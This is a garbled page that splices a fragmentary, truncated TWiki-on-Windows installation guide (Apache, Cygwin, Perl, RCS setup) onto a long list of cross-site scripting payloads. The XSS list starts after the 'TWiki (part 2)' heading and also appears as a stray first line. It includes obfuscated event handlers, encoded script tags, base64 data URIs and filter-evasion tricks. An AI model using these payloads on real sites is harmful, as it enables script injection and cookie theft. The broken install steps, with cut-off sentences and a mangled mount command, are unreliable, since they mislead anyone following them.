 ' onerror=alert(1);'
<h3><a name="Alternatives"> Alternatives </a></h3>
<a href="http://twiki.org/cgi-bin/" title="'Codev.ActiveState' on TWiki site, we know it!">TWiki:Codev.ActiveState</a>
<a href="http://twiki.org/cgi-bin/view/Codev.TWikiOnWindows" title="'Codev.TWikiOnWindows' on TWiki site, we know it!">TWiki:Codev.TWikiOnWindows</a>
<a href="http://twiki.org/cgi-bin/view/Codev.TWikiOnWindowsKnownConfigurations" title="'Codev.TWikiOnWindowsKnownConfigurations' on TWiki site, we know it!">Configurations</a>
<a href="http://twiki.org/cgi-bin/view/Support.TwikiOnWindowsBinaryAttachments" title="'Support.TwikiOnWindowsBinaryAttachments' on TWiki site, we know it!">TWiki:Support</a>.
<h2><a name="Checking_versions"> Checking versions </a></h2>
If you already have some of these add-ons installed, here's how to check the versions - this assumes you have
<i>: Cygwin DLL version is the number in 1.3.x format</i>
less c:/<i>your-apache-dir</i>/Announcement
If you have an older version of any component, do yourself a favour and <strong>upgrade it</strong> as part of the install process.
<h2><a name="Pre_requisites_and_upgrades"> Pre-requisites and upgrades </a></h2>
<h3><a name="Text_editing"> Text editing </a></h3>
<code>nano</code>, a non-GUI editor, but if you prefer to use a GUI editor, you should first install PFE, a freeware editor that supports Unix format files. PFE is available
Another good <a href="http://twiki.org/cgi-bin/view/Codev.OpenSource" title="'Codev.OpenSource' on TWiki site, we know it!">TWiki:Codev.OpenSource</a>
<h2><a name="The_Unix_Windows_Environment"> The Unix/Windows Environment </a></h2>
It's a little known fact that you can use pathnames such as <code><b>c:/apache</b></code> almost everywhere in Windows - try it in a File Open dialogue box.
The reason this matters is that <code><b>'\'</b></code> is a special character to Perl and other tools, so it's much easier to use <code><b>'/'</b></code> everywhere.
<h3><a name="The_Cygwin_environment"> The Cygwin environment </a></h3>
<a href="http://twiki.org/cgi-bin/view/Codev.CygWin" title="'Codev.CygWin' on TWiki site, we know it!">TWiki:Codev.CygWin</a> is a Unix-like environment for Windows
<h3><a name="The_Apache_environment"> The Apache environment </a></h3>
If you need to use spaces in file names (not recommended), put double quotes around the file name in the <code>httpd.conf</code>
<h3><a name="The_Perl_environment"> The Perl environment </a></h3>
<code>ls</code>, <code>egrep</code>, and RCS tools that it (typically) launches with the <code>bash</code> shell.
If you need to use spaces in file names (not recommended), you <em>may</em><code>TWiki.cfg</code>
<h2><a name="Installing_Components"> Installing Components </a></h2>
<h3><a name="TWiki_part_1_"> TWiki (part 1) </a></h3>
Head to <a href="http://twiki.org" target="_top">http://twiki.org</a>
<h3><a name="Apache"> Apache </a></h3>
<strong>1. Download Apache</strong>
<a href="http://httpd.apache.org/" target="_top">http://httpd.apache.org/</a>
<a href="http://www.apache.org/dist/httpd/Announcement.html" target="_top">this page</a>
<a href="http://www.apache.org/dyn/closer.cgi" target="_top">http://www.apache.org/dyn/closer.cgi</a>
The file to download is <code><b></b></code>
<strong><em>NOTE</em></strong><code><b>instmsi.exe</b></code><a href="http://httpd.apache.org/dist/httpd/binaries/win32/" target="_top"></a>
<strong><em>NOTE</em></strong>: The Apache package itself requires a download of around 2 MB, and up to 10 MB of free disk space once installed.
<strong>2. Install Apache</strong>
Specify <code><b>c:\</b></code> as the installation directory - this actually installs Apache into <code><b>c:\apache</b></code> (if you specify <code>c:\apache</code>
<a href="http://httpd.apache.org/docs/windows.html" target="_top">Installing Apache on Windows</a> and <a href="http://httpd.apache.org/docs/win_service.html" target="_top">Windows NT/2000 service</a>.
<strong>3. Test Apache</strong>
If necessary, start apache, either as a Win2000 service (using Admin Tools | Computer Management, or by typing <code>apache -k start -n apache</code>
Point your browser at <a href="http://yourdomain.com/" target="_top">http://yourdomain.com/</a> to see the Apache intro page.
<code>apache -k restart</code> for standalone Apache process running in another window
<code>apache -k restart -n apache</code> for Apache running as a Win2000 service (-n gives name of service)
Another useful command is <code>apache -k stop</code>.
<h3><a name="Cygwin_Unix_tools_Perl_and_RCS"> </a> Cygwin, Unix tools, Perl and RCS </h3>
<strong>4. Install Cygwin</strong>
Head to <a href="http://cygwin.com" target="_top">http://cygwin.com</a>, and click the <strong><em>Install Cygwin Now</em></strong> link.
Now run the Cygwin <code>setup.exe</code> file - this will also install Perl and RCS in one fell swoop.
On first page, accept the defaults (be sure that the <strong><em>default text file type is Unix</em></strong> to avoid problems with attachment uploads, and specify 'install for all users')
Select <code>c:\download\cygwin-dist</code> as the local package directory, and suitable proxy settings, then pick a local mirror site
In the package list screen, hit the <strong>View</strong> button until you get an alphabetical list that says <strong>Full</strong> to the right of the button.
Leave the radio button on <strong>Curr</strong> (Current)
For each package, make sure the <strong>New</strong> column in the installer has a version number under it. If it says 'Skip' or 'Keep'
<code>bash</code>
<code>wget</code> (optional, useful for Perl install and <a href="http://twiki.org/cgi-bin/view/Codev.ReadWriteOfflineWiki" title="'Codev.ReadWriteOfflineWiki' on TWiki site, we know it!">TWiki:Codev.ReadWriteOfflineWiki</a>)
<a href="http://cygwin.com/faq/faq.html#SEC32" target="_top">Cygwin FAQ entry</a> and upgrade <code>libncurses5</code>.
<strong><em>NOTE</em></strong>: The mandatory packages require a download of about 12 MB - about half of this is Perl, which would be necessary even without Cygwin, and most of the rest is gcc
<strong><em>NOTE</em></strong>: The installer keeps a local copy of downloaded files, so it's easy to re-install without re-downloading.
<strong>5. Test Cygwin</strong>
Launch the desktop icon - this runs the <code>bash</code> shell, which has command line editing features
TIP: When typing a directory or file name, hit the TAB key after the first few letters of the name - <code>bash</code> will 'complete' the name.
Type <code>rcs -V</code> - you should see the RCS version, 5.7
Type <code>perl -v</code> - you should see cygwin mentioned in the first line, and the Perl version, 5.6.1
Type <code>grep home /etc/passwd</code> - you should see some output.
The <a href="http://cygwin.com/cygwin-ug-net/cygwin-ug-net.html" target="_top">Cygwin User Guide</a> is well worth reading for some background on how Cygwin works.
<strong>6. Configure Cygwin for binary mode</strong>
<strong><em>This is very important - omitting this step leads to a partially working system that corrupts RCS files</em></strong>
<a href="http://twiki.org/cgi-bin/view/Codev.CookbookLineEndingProblems" title="'Codev.CookbookLineEndingProblems' on TWiki site, we know it!">TWiki:Codev.CookbookLineEndingProblems</a>
<b>mkdir /twiki /c c:/twiki</b>
This configures <code>/twiki</code> (known as a 'mount point') to map onto <code>c:/twiki</code> and for that directory tree to always be in binary mode, and does the same for <code>/c</code>
It is <strong>very important</strong> that all lines in the output of <code>mount</code> say 'binmode' under Flags
If the lines for <code>C:\cygwin</code> directories do not, you should uninstall and then re-install Cygwin to ensure that binary attachment uploads will work.
<a href="http://www.cygwin.com/cygwin-ug-net/using.html" target="_top">Cygwin documentation</a> for more details on this.
Type <code><b>cd /twiki</b></code>
Type <code><b>echo hi &gt;t</b></code>
Type <code><b>cat -v t</b></code> - you should see <code><b>hi</b></code> as the output
If you see filename errors, your <strong>mounts did not work</strong> for some reason - check your typing
If you see <code><b>hi^M</b></code> as output, <strong>your /twiki directory is not in binary mode</strong>
Clean up by doing <code>rm t</code>
This setup is written to the Windows registry, so there's no need to put these commands into a <code>.profile</code> file. For more information on binary vs text mode, see this
<a href="http://cygwin.com/cygwin-ug-net/using-textbinary.html" target="_top">User Guide section</a> and this <a href="http://cygwin.com/faq/faq.html#SEC54" target="_top">FAQ entry</a>.
<h3><a name="TWiki_part_2_"> TWiki (part 2) </a></h3>
/></track><video><source onerror=javascript:window.onerror=alert();script:al\u0065rt();
 onmouseover='alert("xss".toUpperCase())
!#%&)(*+,-./:;=?@]\[^_'}|{~""" style="background:url(javascript:alert(1))" "
!#%&)(*+,-./:;=?@]\[^_'}|{~"<s>"><script>alert(1)</script>
!#%&)(*+,-./:;=?@]\[^_'}|{~&#39;<s>&#39;><script>alert(1)</script>
!#%&)(*+,-./:;=?@]\[^_'}|{~<s><script>alert(1)</script>
!#%&)(*+,-./:;=?@]\&#39;&#39;style=&#39;background:url(javascript:alert(1))&#39; &#39;
" onmouseover="alert('\u0058\u0053\u0053')
" onmouseover="alert('&#0088;&#0083;&#0083;')
" onmouseover="alert(/&#0088;&#0083;&#0083;/.source)
"'><script>eval("alert(document\x2ecookie)")</script>
"/onmousemove="window['\u0061lert']('\u0058SS')
"/onmouseover="window['aler'+'t']('XS'+'S')">
"&#39;><img src="javascript:alert(1)>
"&#39;><script>alert(1)</script> onclick=alert(1)
"</table><video><source onerror=javascript:window.onerror=alert();onerror=\u0061lert();
"</table><video><source onerror=jAvaScrIpt:window.onerror=alert();onerror=\u0061lert();
"><script>eval('u0061u006cu0065u0072u0074u0028u0027u0058u0053u0053u0027u0029');</script>
"><script>eval("al"+"ert(1)");</script>
"><svg><script>alert&#40/1/.source&#41</script>
"onbeforepaste="&#000119indow['&#00097lert']('&#00088SS')" 
"onblur="&#x0077indow['&#x0061lert']('&#x0058SS')" 
"oncopy="&#0119indow['&#097lert']('&#088SS')" 
"ondblclick="&#00119indow['&#0097lert']('&#0088SS')"
"onKeyDown="document.write('<x73cript>x61lert(x22XSSx22)</x73cript>')"
"onKeyPress="/127641/['constructor']['constructor']('al'+'ert'+'('+'''+1+'''+')')()
"onKeyPress="u0077indow['u0061lert']('u0058SS')" 
"onmouseover="&#x077indow['&#x061lert']('&#x058SS')" 
"onmouseover="alert(decodeURI(decodeURI(/%58%53%53/.source)))"
"onpaste="&#119indow['&#97lert']('&#88SS')" 
"onSelectStart="/123441/['cons'+'truc'+'tor']['cons'+'truc'+'tor']('a'+'l'+'e'+'r'+'t'+'('+'''+'XS'+'S'+'''+')')()
"onSelectStart="&#x00077indow['&#x00061lert']('&#x00058SS')"
"st%00yle="behavior:\0075rl(bc)"onread%00ystatechange="ale%00rt(1)
\u0061lert();script:\u0061lert();<video><source onerror=javascript:window.onerror=alert``;java
&#39; style=&#39;background:url(javascript:alert(1))&#39; &#39;
&#39;<s>&#39;><img src="javascript:alert(1)&#39;>
&#39;<s>&#39;><script>alert(1)</script>
&#39;><s><img src="javascript:alert(1)>
&#x09;</track><video><source onerror=javascript:window.onerror=alert();\u0061lert``;
&#x09;rel=<video><source <thead onerror=\u0061lert();
#saivs.js <video><source onerror=javascript:window.onerror=alert();javascript:alert();
%83%A1%82%83%A1%9E%83%A1%9Cscript%20%83%A1%9E%20alert(1)//%20%83%A1%9C/script%20%83%A1%9E
%EF%BC%9Cscript%EF%BC%9Ealert(1)%EF%BC%9C/script%EF%BC%9E
` onmouseover=`alert(/xss/.source.toUpperCase())
</command>enctype=rows=<video><source onerror=alert();
</form>al\u0065rt``;<video><source onerror=javascript:window.onerror=alert();alert();
</frameset></track><video><source src=x onerror=javascript:window.onerror=alert();
</iframe> /></textarea><video><source onerror=alert();
<%u00df style="color:ex/***/pression(alert(1));"/>
<a href="test:),< s c r i p t > a l e r t ( document.domain ) < / s c r i p t >">click me</a>
<a href=data:html;base64,PHNjcmlwdD5hbGVydCgwKTs8L3NjcmlwdD4=>a</a>
<body onload=alert(1); />
<body onmouseover=alert(1); <canvas </basefont>
<div style="color:\0065xpression(alert('XSS2'));">b</div>
<div style="color:&#x65;xpression(alert(1));">a</div>
<div style="left:&#x0065;xpression(alert(1))">
<embed onload=alert();<script type="text/javascript">
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
<embed/<a/onload=alert();?n<script type="text/javascript">
<embed/onload=al?u0065rt();?n<script type="text/javascript">
<embed/src=# onload=confirm();?n<script type="text/javascrip t">
<frameset><frame/onload=alert(1); />
<iframe onload=alert``; /><select
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="></iframe>
<iframe src=# <keygen onload=alert();?n<script></script>
<iframe/*/onload=charset=alert();>
<iframe/onload=alert();>size=<command
<iframe/onload=alert(1); />
<img src= <meter onerror=alert();?n<script></script>
<img src=# <keygen onerror=?u0061lert``;>
<img src=x alt=confirm(1) onmouseover=eval(alt)>
<keygen name="confirm(1)" onfocus="eval(this.name);" autofocus>
<object/data=evil.html #</a>
<object/onload="onfocus=alert();"<script type="text/javascri pt">
<object/src=# onload=alert();?n<script type="text/javascript ">
<object/src=x onload=alert(1);?n<script type="text/javascript">
<progress </caption><video><source <body onerror=alert();
<script src="data:text/html,al?u0065rt``;"<script></script>
<script src="http://example.com/xss.jpg"></script>
<script src=# <label onerror=confirm();?n<script></script>
<script/src="data:text/html,alert();"<script></script>
<script>al?u0065rt();</script></tr><th/
<script>al?u0065rt();</script></tr><th/
<script>onerror=?u0061lert(1);</script>
<style><img src='</style><img src=x onerror=alert(1)//'>
<svg/<canvas/<select/onload=confirm();>
<svg/<canvas/<select/onload=confirm(1);>
<svg/onload="?u0061lert();"></output>
<svg/onload=al?u0065rt();?n<script type="text/javascript">
<svg/onload=alert(1); </del>
<svg><style><img/src=x onerror=alert(1)// </b>
<video><source <tfoot <td onerror=javascript:window.onerror=alert();alert();
al?u0065rt();<script>confirm();</script>
colspan=<iframe <a onload=al?u0065rt();>
icon=<body <input/onload=confirm(1);>
icon=<iframe/<body onload=?u0061lert();>
icon=<iframe/<img onload=al?u0065rt();>
javascript:\u0061lert();</script><frameset><basefont/</td>
kind=<body <img onload=alert``;>
onerror=javascript:window.onerror=alert();</td><video><source onerror=javascript:window.onerror=alert();script:al\u0065rt();
